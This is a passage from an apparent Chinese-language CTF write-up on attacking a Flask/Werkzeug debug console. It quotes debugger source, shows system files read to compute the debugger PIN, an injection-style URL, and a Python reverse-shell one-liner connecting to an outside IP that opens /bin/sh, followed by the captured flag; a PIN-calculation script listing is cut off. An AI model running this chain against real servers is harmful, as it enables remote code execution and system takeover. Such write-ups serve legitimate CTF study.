show_hidden_frames: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">                pin_security: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">                pin_logging: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">            </span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> console_init_func:</span><br><span class="line">                    console_init_func = <span class="literal">None</span></span><br><span class="line">                self.app = app</span><br><span class="line">                self.evalex = evalex</span><br><span class="line">                self.frames: t.<span class="type">Dict</span>[<span class="built_in">int</span>, t.<span class="type">Union</span>[DebugFrameSummary, _ConsoleFrame]] = &#123;&#125;</span><br><span class="line">                self.request_key = request_key</span><br><span class="line">                self.console_path = console_path</span><br><span class="line">                self.console_init_func = console_init_func</span><br><span class="line">                self.show_hidden_frames = show_hidden_frames</span><br><span class="line">                self.secret = gen_salt(<span class="number">20</span>)</span><br><span class="line">                self._failed_pin_auth = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">                self.pin_logging = pin_logging</span><br><span class="line">                <span class="keyword">if</span> pin_security:</span><br><span class="line">                    <span class="comment"># Print out the pin for the debugger on standard out.</span></span><br><span class="line">                    <span class="keyword">if</span> os.environ.get(<span class="string">&quot;WERKZEUG_RUN_MAIN&quot;</span>) == <span class="string">&quot;true&quot;</span> <span class="keyword">and</span> pin_logging:</span><br><span class="line">                        _log(<span class="string">&quot;warning&quot;</span>, <span class="string">&quot; * Debugger is active!&quot;</span>)</span><br><span class="line">                        <span class="keyword">if</span> self.pin <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                            _log(<span class="string">&quot;warning&quot;</span>, <span class="string">&quot; * Debugger PIN disabled. DEBUGGER UNSECURED!&quot;</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            _log(<span class="string">&quot;info&quot;</span>, <span class="string">&quot; * Debugger PIN: %s&quot;</span>, self.pin)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.pin = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">            @property</span></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">pin</span>(<span class="params">self</span>) -&gt; t.<span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(self, <span class="string">&quot;_pin&quot;</span>):</span><br><span class="line">                    pin_cookie = get_pin_and_cookie_name(self.app)</span><br><span class="line">                    self._pin, self._pin_cookie = pin_cookie  <span class="comment"># type: ignore</span></span><br><span class="line">                <span class="keyword">return</span> self._pin</span><br><span class="line"></span><br><span class="line"><span class="meta">            @pin.setter</span></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">pin</span>(<span class="params">self, value: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">                self._pin = value</span><br><span class="line"></span><br><span class="line"><span class="meta">            @property</span></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">pin_cookie_name</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">                <span class="string">&quot;&quot;&quot;The name of the pin cookie.&quot;&quot;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(self, <span class="string">&quot;_pin_cookie&quot;</span>):</span><br><span class="line">                    pin_cookie = get_pin_and_cookie_name(self.app)</span><br><span class="line">                    self._pin, self._pin_cookie = pin_cookie  <span class="comment"># type: ignore</span></span><br><span class="line">                <span class="keyword">return</span> self._pin_cookie</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">debug_application</span>(<span class="params"></span></span><br><span class="line"><span class="params">                self, environ: <span class="string">&quot;WSGIEnvironment&quot;</span>, start_response: <span class="string">&quot;StartResponse&quot;</span></span></span><br><span class="line"><span class="params">            </span>) -&gt; t.Iterator[<span class="built_in">bytes</span>]:</span><br><span class="line">                <span class="string">&quot;&quot;&quot;Run the application and conserve the traceback frames.&quot;&quot;&quot;</span></span><br><span class="line">                app_iter = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    app_iter = self.app(environ, start_response)</span><br><span class="line">                    <span class="keyword">yield</span> <span class="keyword">from</span> app_iter</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">hasattr</span>(app_iter, <span class="string">&quot;close&quot;</span>):</span><br><span class="line">                        app_iter.close()  <span class="comment"># type: ignore</span></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">hasattr</span>(app_iter, <span class="string">&quot;close&quot;</span>):</span><br><span class="line">                        app_iter.close()  <span class="comment"># type: ignore</span></span><br><span class="line"></span><br><span class="line">                    tb = DebugTraceback(e, skip=<span class="number">1</span>, hide=<span class="keyword">not</span> self.show_hidden_frames)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> frame <span class="keyword">in</span> tb.all_frames:</span><br><span class="line">                        self.frames[<span class="built_in">id</span>(frame)] = frame</span><br><span class="line"></span><br><span class="line">                    is_trusted = <span class="built_in">bool</span>(self.check_pin_trust(environ))</span><br><span class="line">                    html = tb.render_debugger_html(</span><br><span class="line">                        evalex=self.evalex,</span><br><span class="line">                        secret=self.secret,</span><br><span class="line">                        evalex_trusted=is_trusted,</span><br><span class="line">                    )</span><br><span class="line">                    response = Response(html, status=<span class="number">500</span>, mimetype=<span class="string">&quot;text/html&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">yield</span> <span class="keyword">from</span> response(environ, start_response)</span><br><span class="line">                    <span class="keyword">except</span> Exception:</span><br><span class="line">                        <span class="comment"># if we end up here there has been output but an error</span></span><br><span class="line">                        <span class="comment"># occurred.  in that situation we can do nothing fancy any</span></span><br><span class="line">                        <span class="comment"># more, better log something into the error log and fall</span></span><br><span class="line">                        <span class="comment"># back gracefully.</span></span><br><span class="line">                        environ[<span class="string">&quot;wsgi.errors&quot;</span>].write(</span><br><span class="line">                            <span class="string">&quot;Debugging middleware caught exception in streamed &quot;</span></span><br><span class="line">                            <span class="string">&quot;response at a point where response headers were already &quot;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">                        )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    environ[&quot;</span>wsgi.errors<span class="string">&quot;].write(&quot;</span><span class="string">&quot;.join(tb.render_traceback_text()))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            def execute_command(</span></span><br><span class="line"><span class="string">                self,</span></span><br><span class="line"><span class="string">                request: Request,</span></span><br><span class="line"><span class="string">                command: str,</span></span><br><span class="line"><span class="string">                frame: t.Union[DebugFrameSummary, _ConsoleFrame],</span></span><br><span class="line"><span class="string">            ) -&gt; Response:</span></span><br><span class="line"><span class="string">                &quot;</span><span class="string">&quot;&quot;</span>Execute a command <span class="keyword">in</span> a console.<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                return Response(frame.eval(command), mimetype=&quot;text/html&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            def display_console(self, request: Request) -&gt; Response:</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span>Display a standalone shell.<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                if 0 not in self.frames:</span></span><br><span class="line"><span class="string">                    if self.console_init_func is None:</span></span><br><span class="line"><span class="string">                        ns = &#123;&#125;</span></span><br><span class="line"><span class="string">                    else:</span></span><br><span class="line"><span class="string">                        ns = dict(self.console_init_func())</span></span><br><span class="line"><span class="string">                    ns.setdefault(&quot;app&quot;, self.app)</span></span><br><span class="line"><span class="string">                    self.frames[0] = _ConsoleFrame(ns)</span></span><br><span class="line"><span class="string">                is_trusted = bool(self.check_pin_trust(request.environ))</span></span><br><span class="line"><span class="string">                return Response(</span></span><br><span class="line"><span class="string">                    render_console_html(secret=self.secret, evalex_trusted=is_trusted),</span></span><br><span class="line"><span class="string">                    mimetype=&quot;text/html&quot;,</span></span><br><span class="line"><span class="string">                )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            def get_resource(self, request: Request, filename: str) -&gt; Response:</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span>Return a static resource <span class="keyword">from</span> the shared folder.<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                path = join(&quot;shared&quot;, basename(filename))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                try:</span></span><br><span class="line"><span class="string">                    data = pkgutil.get_data(__package__, path)</span></span><br><span class="line"><span class="string">                except OSError:</span></span><br><span class="line"><span class="string">                    return NotFound()  # type: ignore[return-value]</span></span><br><span class="line"><span class="string">                else:</span></span><br><span class="line"><span class="string">                    if data is None:</span></span><br><span class="line"><span class="string">                        return NotFound()  # type: ignore[return-value]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    etag = str(adler32(data) &amp; 0xFFFFFFFF)</span></span><br><span class="line"><span class="string">                    return send_file(</span></span><br><span class="line"><span class="string">                        BytesIO(data), request.environ, download_name=filename, etag=etag</span></span><br><span class="line"><span class="string">                    )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            def check_pin_trust(self, environ: &quot;WSGIEnvironment&quot;) -&gt; t.Optional[bool]:</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span>Checks <span class="keyword">if</span> the request passed the pin test.  This returns `<span class="literal">True</span>` <span class="keyword">if</span> the</span><br><span class="line">                request <span class="keyword">is</span> trusted on a pin/cookie basis <span class="keyword">and</span> returns `<span class="literal">False</span>` <span class="keyword">if</span> <span class="keyword">not</span>.</span><br><span class="line">                Additionally <span class="keyword">if</span> the cookie<span class="string">&#x27;s stored pin hash is wrong it will return</span></span><br><span class="line"><span class="string">                `None` so that appropriate action can be taken.</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                if self.pin is None:</span></span><br><span class="line"><span class="string">                    return True</span></span><br><span class="line"><span class="string">                val = parse_cookie(environ).get(self.pin_cookie_name)</span></span><br><span class="line"><span class="string">                if not val or &quot;|&quot; not in val:</span></span><br><span class="line"><span class="string">                    return False</span></span><br><span class="line"><span class="string">                ts, pin_hash = val.split(&quot;|&quot;, 1)</span></span><br><span class="line"><span class="string">                if not ts.isdigit():</span></span><br><span class="line"><span class="string">                    return False</span></span><br><span class="line"><span class="string">                if pin_hash != hash_pin(self.pin):</span></span><br><span class="line"><span class="string">                    return None</span></span><br><span class="line"><span class="string">                return (time.time() - PIN_TIME) &lt; int(ts)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            def _fail_pin_auth(self) -&gt; None:</span></span><br><span class="line"><span class="string">                time.sleep(5.0 if self._failed_pin_auth &gt; 5 else 0.5)</span></span><br><span class="line"><span class="string">                self._failed_pin_auth += 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            def pin_auth(self, request: Request) -&gt; Response:</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;Authenticates with the pin.&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                exhausted = False</span></span><br><span class="line"><span class="string">                auth = False</span></span><br><span class="line"><span class="string">                trust = self.check_pin_trust(request.environ)</span></span><br><span class="line"><span class="string">                pin = t.cast(str, self.pin)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                # If the trust return value is `None` it means that the cookie is</span></span><br><span class="line"><span class="string">                # set but the stored pin hash value is bad.  This means that the</span></span><br><span class="line"><span class="string">                # pin was changed.  In this case we count a bad auth and unset the</span></span><br><span class="line"><span class="string">                # cookie.  This way it becomes harder to guess the cookie name</span></span><br><span class="line"><span class="string">                # instead of the pin as we still count up failures.</span></span><br><span class="line"><span class="string">                bad_cookie = False</span></span><br><span class="line"><span class="string">                if trust is None:</span></span><br><span class="line"><span class="string">                    self._fail_pin_auth()</span></span><br><span class="line"><span class="string">                    bad_cookie = True</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                # If we&#x27;</span>re trusted, we<span class="string">&#x27;re authenticated.</span></span><br><span class="line"><span class="string">                elif trust:</span></span><br><span class="line"><span class="string">                    auth = True</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                # If we failed too many times, then we&#x27;</span>re locked out.</span><br><span class="line">                <span class="keyword">elif</span> self._failed_pin_auth &gt; <span class="number">10</span>:</span><br><span class="line">                    exhausted = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Otherwise go through pin based authentication</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    entered_pin = request.args[<span class="string">&quot;pin&quot;</span>]</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> entered_pin.strip().replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) == pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>):</span><br><span class="line">                        self._failed_pin_auth = <span class="number">0</span></span><br><span class="line">                        auth = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        self._fail_pin_auth()</span><br><span class="line"></span><br><span class="line">                rv = Response(</span><br><span class="line">                    json.dumps(&#123;<span class="string">&quot;auth&quot;</span>: auth, <span class="string">&quot;exhausted&quot;</span>: exhausted&#125;),</span><br><span class="line">                    mimetype=<span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">if</span> auth:</span><br><span class="line">                    rv.set_cookie(</span><br><span class="line">                        self.pin_cookie_name,</span><br><span class="line">                        <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>|<span class="subst">&#123;hash_pin(pin)&#125;</span>&quot;</span>,</span><br><span class="line">                        httponly=<span class="literal">True</span>,</span><br><span class="line">                        samesite=<span class="string">&quot;Strict&quot;</span>,</span><br><span class="line">                        secure=request.is_secure,</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">elif</span> bad_cookie:</span><br><span class="line">                    rv.delete_cookie(self.pin_cookie_name)</span><br><span class="line">                <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">log_pin_request</span>(<span class="params">self</span>) -&gt; Response:</span><br><span class="line">                <span class="string">&quot;&quot;&quot;Log the pin if needed.&quot;&quot;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> self.pin_logging <span class="keyword">and</span> self.pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    _log(</span><br><span class="line">                        <span class="string">&quot;info&quot;</span>, <span class="string">&quot; * To enable the debugger you need to enter the security pin:&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                    _log(<span class="string">&quot;info&quot;</span>, <span class="string">&quot; * Debugger pin code: %s&quot;</span>, self.pin)</span><br><span class="line">                <span class="keyword">return</span> Response(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params"></span></span><br><span class="line"><span class="params">                self, environ: <span class="string">&quot;WSGIEnvironment&quot;</span>, start_response: <span class="string">&quot;StartResponse&quot;</span></span></span><br><span class="line"><span class="params">            </span>) -&gt; t.Iterable[<span class="built_in">bytes</span>]:</span><br><span class="line">                <span class="string">&quot;&quot;&quot;Dispatch the requests.&quot;&quot;&quot;</span></span><br><span class="line">                <span class="comment"># important: don&#x27;t ever access a function here that reads the incoming</span></span><br><span class="line">                <span class="comment"># form data!  Otherwise the application won&#x27;t have access to that data</span></span><br><span class="line">                <span class="comment"># any more!</span></span><br><span class="line">                request = Request(environ)</span><br><span class="line">                response = self.debug_application</span><br><span class="line">                <span class="keyword">if</span> request.args.get(<span class="string">&quot;__debugger__&quot;</span>) == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">                    cmd = request.args.get(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">                    arg = request.args.get(<span class="string">&quot;f&quot;</span>)</span><br><span class="line">                    secret = request.args.get(<span class="string">&quot;s&quot;</span>)</span><br><span class="line">                    frame = self.frames.get(request.args.get(<span class="string">&quot;frm&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>))  <span class="comment"># type: ignore</span></span><br><span class="line">                    <span class="keyword">if</span> cmd == <span class="string">&quot;resource&quot;</span> <span class="keyword">and</span> arg:</span><br><span class="line">                        response = self.get_resource(request, arg)  <span class="comment"># type: ignore</span></span><br><span class="line">                    <span class="keyword">elif</span> cmd == <span class="string">&quot;pinauth&quot;</span> <span class="keyword">and</span> secret == self.secret:</span><br><span class="line">                        response = self.pin_auth(request)  <span class="comment"># type: ignore</span></span><br><span class="line">                    <span class="keyword">elif</span> cmd == <span class="string">&quot;printpin&quot;</span> <span class="keyword">and</span> secret == self.secret:</span><br><span class="line">                        response = self.log_pin_request()  <span class="comment"># type: ignore</span></span><br><span class="line">                    <span class="keyword">elif</span> (</span><br><span class="line">                        self.evalex</span><br><span class="line">                        <span class="keyword">and</span> cmd <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">                        <span class="keyword">and</span> frame <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">                        <span class="keyword">and</span> self.secret == secret</span><br><span class="line">                        <span class="keyword">and</span> self.check_pin_trust(environ)</span><br><span class="line">                    ):</span><br><span class="line">                        response = self.execute_command(request, cmd, frame)  <span class="comment"># type: ignore</span></span><br><span class="line">                <span class="keyword">elif</span> (</span><br><span class="line">                    self.evalex</span><br><span class="line">                    <span class="keyword">and</span> self.console_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">                    <span class="keyword">and</span> request.path == self.console_path</span><br><span class="line">                ):</span><br><span class="line">                    response = self.display_console(request)  <span class="comment"># type: ignore</span></span><br><span class="line">                <span class="keyword">return</span> response(environ, start_response)</span><br></pre></td></tr></table></figure>


<blockquote>
<p>&#x2F;etc&#x2F;passwd</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">ctf:x:1000:1000::/home/ctf:/bin/sh</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ctf</p>
</blockquote>
<blockquote>
<p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:42:c0:a8:10:03</span><br></pre></td></tr></table></figure>
<p>转10进制</p>
<blockquote>
<p>2485723336707</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_generate</span>() -&gt; t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">                linux = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">                <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                            value = f.readline().strip()</span><br><span class="line">                    <span class="keyword">except</span> OSError:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> value:</span><br><span class="line">                        linux += value</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Containers share the same machine id, add some cgroup</span></span><br><span class="line">                <span class="comment"># information. This is used outside containers too but should be</span></span><br><span class="line">                <span class="comment"># relatively stable across boots.</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">                <span class="keyword">except</span> OSError:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> linux:</span><br><span class="line">                    <span class="keyword">return</span> linux</span><br></pre></td></tr></table></figure>
<blockquote>
<p>&#x2F;proc&#x2F;self&#x2F;cgroup</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">12:hugetlb:/docker/27463fd01e5d914f4b589d351c7c59462b1e4e0139e500835dc7719810e7e2b0</span><br><span class="line">11:cpuset:/docker/27463fd01e5d914f4b589d351c7c59462b1e4e0139e500835dc7719810e7e2b0</span><br><span class="line">10:rdma:/</span><br><span class="line">9:devices:/docker/27463fd01e5d914f4b589d351c7c59462b1e4e0139e500835dc7719810e7e2b0</span><br><span class="line">8:blkio:/docker/27463fd01e5d914f4b589d351c7c59462b1e4e0139e500835dc7719810e7e2b0</span><br><span class="line">7:freezer:/docker/27463fd01e5d914f4b589d351c7c59462b1e4e0139e500835dc7719810e7e2b0</span><br><span class="line">6:perf_event:/docker/27463fd01e5d914f4b589d351c7c59462b1e4e0139e500835dc7719810e7e2b0</span><br><span class="line">5:cpu,cpuacct:/docker/27463fd01e5d914f4b589d351c7c59462b1e4e0139e500835dc7719810e7e2b0</span><br><span class="line">4:pids:/docker/27463fd01e5d914f4b589d351c7c59462b1e4e0139e500835dc7719810e7e2b0</span><br><span class="line">3:memory:/docker/27463fd01e5d914f4b589d351c7c59462b1e4e0139e500835dc7719810e7e2b0</span><br><span class="line">2:net_cls,net_prio:/docker/27463fd01e5d914f4b589d351c7c59462b1e4e0139e500835dc7719810e7e2b0</span><br><span class="line">1:name=systemd:/docker/27463fd01e5d914f4b589d351c7c59462b1e4e0139e500835dc7719810e7e2b0</span><br><span class="line">0::/system.slice/containerd.service</span><br></pre></td></tr></table></figure>
<blockquote>
<p>40e26dc06e3155fda79ecf8a42294928c385382fd8e0e037d6c93d020a4023f8</p>
</blockquote>
<blockquote>
<p>&#x2F;etc&#x2F;machine-id<br>1cc402dd0e11d5ae18db04a6de87223d</p>
</blockquote>
<blockquote>
<p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id<br>e86c4117-eed3-4a37-82bc-b5fa47a88e0b</p>
</blockquote>
<blockquote>
<p>&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py</p>
</blockquote>
<blockquote>
<p>&#x2F;view?note_id&#x3D;0’||1&#x3D;1</p>
</blockquote>
<p>交PIN码</p>
<p>访问出错，然后打开console交互</p>
<p>弹shell<br>import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“47.107.56.244”,8086));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);</p>
<blockquote>
<p>ls &#x2F;</p>
</blockquote>
<blockquote>
<p>&#x2F;readflag</p>
</blockquote>
<p>*ctf{exploit_Update_with_Version}</p>
<p>PIN码一键计算脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span 